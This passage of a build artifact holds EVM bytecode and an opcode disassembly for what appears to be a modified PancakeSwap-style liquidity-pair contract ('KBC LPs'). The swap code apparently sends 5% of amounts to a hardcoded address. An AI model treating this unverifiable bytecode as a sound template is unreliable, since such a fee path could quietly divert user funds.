60392600160701b90046001600160701b0316916001600160a01b038616916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b50506001600f5550565b6007546001600160a01b031681565b6009546001600160a01b031681565b428410156116df576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa1580156117fa573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906118305750886001600160a01b0316816001600160a01b0316145b611881576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b61188c898989612079565b505050505050505050565b6000600f546001146118e2576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f819055806118f2610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b15801561194657600080fd5b505afa15801561195a573d6000803e3d6000fd5b505050506040513d602081101561197057600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b1580156119c357600080fd5b505afa1580156119d7573d6000803e3d6000fd5b505050506040513d60208110156119ed57600080fd5b505190506000611a0c836001600160701b03871663ffffffff611e6616565b90506000611a29836001600160701b03871663ffffffff611e6616565b90506000611a378787612183565b60005490915080611a7057611a5b6103e8610afd610fc4878763ffffffff611e0316565b9850611a6a60006103e8612470565b50611a90565b611a8d6001600160701b038916610ffa868463ffffffff611e0316565b98505b60008911611acf5760405162461bcd60e51b81526004018080602001828103825260288152602001806125ff6028913960400191505060405180910390fd5b611ad98a8a612470565b5061108186868a8a611eb6565b600260209081526000928352604080842090915290825290205481565b600a5481565b600f54600114611b52576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854604080516370a0823160e01b81523060048201529051611c62926001600160a01b0316916370a08231916024808301926020929190829003018186803b158015611ba357600080fd5b505afa158015611bb7573d6000803e3d6000fd5b505050506040513d6020811015611bcd57600080fd5b5051600954604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611c1a57600080fd5b505afa158015611c2e573d6000803e3d6000fd5b505050506040513d6020811015611c4457600080fd5b5051600b546001600160701b0380821691600160701b900416611eb6565b6001600f55565b604080518082018252601981527f7472616e7366657228616464726573732c75696e74323536290000000000000060209182015281516001600160a01b0385811660248301526044808301869052845180840390910181526064909201845291810180516001600160e01b031663a9059cbb60e01b1781529251815160009460609489169392918291908083835b60208310611d165780518252601f199092019160209182019101611cf7565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114611d78576040519150601f19603f3d011682016040523d82523d6000602084013e611d7d565b606091505b5091509150818015611dab575080511580611dab5750808060200190516020811015611da857600080fd5b50515b611dfc576040805162461bcd60e51b815260206004820152601860248201527f50616e63616b653a205452414e534645525f4641494c45440000000000000000604482015290519081900360640190fd5b5050505050565b6000811580611e1e57505080820282828281611e1b57fe5b04145b610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6d756c2d6f766572666c6f7760601b604482015290519081900360640190fd5b80820382811115610c75576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160701b038411801590611ed457506001600160701b038311155b611f19576040805162461bcd60e51b815260206004820152601160248201527050616e63616b653a204f564552464c4f5760781b604482015290519081900360640190fd5b600b5463ffffffff42811691600160e01b90048116820390811615801590611f4957506001600160701b03841615155b8015611f5d57506001600160701b03831615155b15611fce578063ffffffff16611f8b85611f7686612556565b6001600160e01b03169063ffffffff61256816565b600c80546001600160e01b03929092169290920201905563ffffffff8116611fb684611f7687612556565b600d80546001600160e01b0392909216929092020190555b600b80546dffffffffffffffffffffffffffff19166001600160701b03888116919091176dffffffffffffffffffffffffffff60701b1916600160701b8883168102919091176001600160e01b0316600160e01b63ffffffff871602179283905560408051848416815291909304909116602082015281517f1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1929181900390910190a1505050505050565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b038316600090815260016020526040902054612104908263ffffffff611e6616565b6001600160a01b038085166000908152600160205260408082209390935590841681522054612139908263ffffffff61258d16565b6001600160a01b03808416600081815260016020908152604091829020949094558051858152905191939287169260008051602061264d83398151915292918290030190a3505050565b600080600760009054906101000a90046001600160a01b03166001600160a01b031663017e7e586040518163ffffffff1660e01b815260040160206040518083038186803b1580156121d457600080fd5b505afa1580156121e8573d6000803e3d6000fd5b505050506040513d60208110156121fe57600080fd5b5051600e546001600160a01b0382161580159450919250906122e25780156122dd576000612241610fc46001600160701b0388811690881663ffffffff611e0316565b9050600061224e836122f6565b9050808211156122da5760006122816008610b47612272868663ffffffff611e6616565b6000549063ffffffff611e0316565b905060006122b661229984600863ffffffff611e0316565b6122aa86601163ffffffff611e0316565b9063ffffffff61258d16565b905060008183816122c357fe5b04905080156122d6576122d68782612348565b5050505b50505b6122ee565b80156122ee576000600e555b505092915050565b60006003821115612339575080600160028204015b818110156123335780915060028182858161232257fe5b04018161232b57fe5b04905061230b565b50612343565b8115612343575060015b919050565b60005461235b908263ffffffff61258d16565b60009081556001600160a01b038316815260016020526040902054612386908263ffffffff61258d16565b6001600160a01b038316600081815260016020908152604080832094909455835185815293519293919260008051602061264d8339815191529281900390910190a35050565b60008183106123db57816123dd565b825b9392505050565b6001600160a01b03821660009081526001602052604090205461240d908263ffffffff611e6616565b6001600160a01b0383166000908152600160205260408120919091555461243a908263ffffffff611e6616565b60009081556040805183815290516001600160a01b0385169160008051602061264d833981519152919081900360200190a35050565b60006001600160a01b0383166124cd576040805162461bcd60e51b815260206004820152601f60248201527f42455032303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b6000546124e0908363ffffffff61258d16565b60009081556001600160a01b03841681526003602052604090205461250b908363ffffffff61258d16565b6001600160a01b038416600081815260036020908152604080832094909455835186815293519293919260008051602061264d8339815191529281900390910190a350600192915050565b6001600160701b0316600160701b0290565b60006001600160701b0382166001600160e01b0384168161258557fe5b049392505050565b80820182811015610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfe50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e54454450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e5450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544a265627a7a72315820cd5f612284cf3e663022f426c74f2bb28d38659c6e56172357818a55c1bf86f864736f6c63430005100032454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x6 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH20 0x9E94EE69F3CDCD5E74E05563736E4679DA6DB44C OR SWAP1 SSTORE PUSH1 0x1 PUSH1 0xF SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x3B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD CHAINID SWAP1 DUP1 PUSH1 0x52 PUSH2 0x280F DUP3 CODECOPY PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB PUSH1 0x52 ADD DUP3 KECCAK256 DUP3 DUP3 ADD DUP3 MSTORE PUSH1 0x7 DUP1 DUP5 MSTORE PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL PUSH1 0x20 SWAP5 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP5 ADD DUP5 MSTORE PUSH1 0x1 DUP2 MSTORE PUSH1 0x31 PUSH1 0xF8 SHL SWAP1 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP6 ADD SWAP3 SWAP1 SWAP3 MSTORE PUSH32 0x6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE DUP3 DUP5 ADD MSTORE PUSH32 0xC89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6 PUSH1 0x60 DUP4 ADD MSTORE PUSH1 0x80 DUP3 ADD SWAP6 SWAP1 SWAP6 MSTORE ADDRESS PUSH1 0xA0 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP3 MLOAD DUP1 DUP4 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xC0 SWAP1 SWAP2 ADD SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 ADD KECCAK256 PUSH1 0x4 SSTORE POP DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND CALLER OR SWAP1 SSTORE PUSH2 0x26EA DUP1 PUSH2 0x125 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1E5 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x10F JUMPI DUP1 PUSH4 0xBC25CF77 GT PUSH2 0xA2 JUMPI DUP1 PUSH4 0xDCBBB373 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0xDCBBB373 EQ PUSH2 0x5FF JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x625 JUMPI DUP1 PUSH4 0xF317739C EQ PUSH2 0x653 JUMPI DUP1 PUSH4 0xFFF6CAE9 EQ PUSH2 0x65B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0xBC25CF77 EQ PUSH2 0x578 JUMPI DUP1 PUSH4 0xC45A0155 EQ PUSH2 0x59E JUMPI DUP1 PUSH4 0xD21220A7 EQ PUSH2 0x5A6 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x5AE JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x900820D8 GT PUSH2 0xDE JUMPI DUP1 PUSH4 0x900820D8 EQ PUSH2 0x534 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x53C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x544 JUMPI DUP1 PUSH4 0xBA9A7A56 EQ PUSH2 0x570 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x4A1 JUMPI DUP1 PUSH4 0x7464FC3D EQ PUSH2 0x4C7 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x4CF JUMPI DUP1 PUSH4 0x89AFCB44 EQ PUSH2 0x4F5 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0x187 JUMPI DUP1 PUSH4 0x47D5D856 GT PUSH2 0x156 JUMPI DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x445 JUMPI DUP1 PUSH4 0x5909C0D5 EQ PUSH2 0x46B JUMPI DUP1 PUSH4 0x5A3D5493 EQ PUSH2 0x473 JUMPI DUP1 PUSH4 0x6A627842 EQ PUSH2 0x47B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD EQ PUSH2 0x3E1 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x417 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x41F JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x43D JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x95EA7B3 GT PUSH2 0x1C3 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x32D JUMPI DUP1 PUSH4 0xDFE1681 EQ PUSH2 0x36D JUMPI DUP1 PUSH4 0x1794BB3C EQ PUSH2 0x391 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x3C7 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x22C0D9F EQ PUSH2 0x1EA JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x278 JUMPI DUP1 PUSH4 0x902F1AC EQ PUSH2 0x2F5 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x80 DUP2 LT ISZERO PUSH2 0x200 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH1 0x40 DUP4 ADD CALLDATALOAD AND SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH1 0x80 DUP2 ADD PUSH1 0x60 DUP3 ADD CALLDATALOAD PUSH5 0x100000000 DUP2 GT ISZERO PUSH2 0x237 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 ADD DUP4 PUSH1 0x20 DUP3 ADD GT ISZERO PUSH2 0x249 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP2 DUP5 PUSH1 0x1 DUP4 MUL DUP5 ADD GT PUSH5 0x100000000 DUP4 GT OR ISZERO PUSH2 0x26B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SWAP1 SWAP3 POP SWAP1 POP PUSH2 0x663 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x280 PUSH2 0xC17 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2BA JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x2A2 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x2E7 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2FD PUSH2 0xC3A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP5 DUP6 AND DUP2 MSTORE SWAP3 SWAP1 SWAP4 AND PUSH1 0x20 DUP4 ADD MSTORE PUSH4 0xFFFFFFFF AND DUP2 DUP4 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x343 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0xC64 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0xC7B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xC8A JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xD13 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xD19 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDB3 JUMP JUMPDEST PUSH2 0x427 PUSH2 0xDD7 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x3CF PUSH2 0xDDC JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x45B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xDE2 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDF4 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDFA JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x491 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xE00 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4B7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x10FE JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1110 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4E5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1116 JUMP JUMPDEST PUSH2 0x51B PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x50B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1128 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0x14CC JUMP JUMPDEST PUSH2 0x280 PUSH2 0x14DB JUMP JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x55A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x14FD JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x150A JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x58E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1510 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1679 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1688 JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x5C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x1697 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x615 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1897 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x63B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x1AE6 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1B03 JUMP JUMPDEST PUSH2 0x276 PUSH2 0x1B09 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x6AC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE DUP5 ISZERO ISZERO DUP1 PUSH2 0x6BF JUMPI POP PUSH1 0x0 DUP5 GT JUMPDEST PUSH2 0x6FA JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x266D PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x705 PUSH2 0xC3A JUMP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP8 LT DUP1 ISZERO PUSH2 0x72A JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP7 LT JUMPDEST PUSH2 0x77B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E53554646494349454E545F4C495155494449545900 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP1 PUSH1 0x64 PUSH1 0x5 DUP12 MUL DIV DUP11 SUB SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0x5 DUP12 MUL PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD SWAP3 SWAP1 SWAP2 DIV DUP13 SUB SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND SWAP2 DUP2 AND SWAP1 DUP12 AND DUP3 EQ DUP1 ISZERO SWAP1 PUSH2 0x7D2 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP12 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ ISZERO JUMPDEST PUSH2 0x819 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x13 PUSH1 0x24 DUP3 ADD MSTORE PUSH19 0x50616E63616B653A20494E56414C49445F544F PUSH1 0x68 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP13 ISZERO PUSH2 0x82A JUMPI PUSH2 0x82A DUP3 DUP13 DUP7 PUSH2 0x1C69 JUMP JUMPDEST DUP12 ISZERO PUSH2 0x83B JUMPI PUSH2 0x83B DUP2 DUP13 DUP6 PUSH2 0x1C69 JUMP JUMPDEST DUP9 ISZERO PUSH2 0x8F6 JUMPI DUP11 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x84800812 CALLER DUP7 DUP7 DUP15 DUP15 PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE PUSH1 0x20 ADD DUP6 DUP2 MSTORE PUSH1 0x20 ADD DUP5 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP5 DUP5 DUP3 DUP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP DUP1 DUP3 DUP5 CALLDATACOPY PUSH1 0x0 DUP2 DUP5 ADD MSTORE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND SWAP1 POP DUP1 DUP4 ADD SWAP3 POP POP POP SWAP7 POP POP POP POP POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x8DD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x8F1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x64 PUSH1 0x5 DUP15 DUP2 MUL DUP3 SWAP1 DIV SWAP2 SWAP1 DUP15 MUL DIV DUP15 ISZERO PUSH2 0x923 JUMPI PUSH1 0x6 SLOAD PUSH2 0x923 SWAP1 DUP6 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH2 0x1C69 JUMP JUMPDEST DUP14 ISZERO PUSH2 0x941 JUMPI PUSH1 0x6 SLOAD PUSH2 0x941 SWAP1 DUP5 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 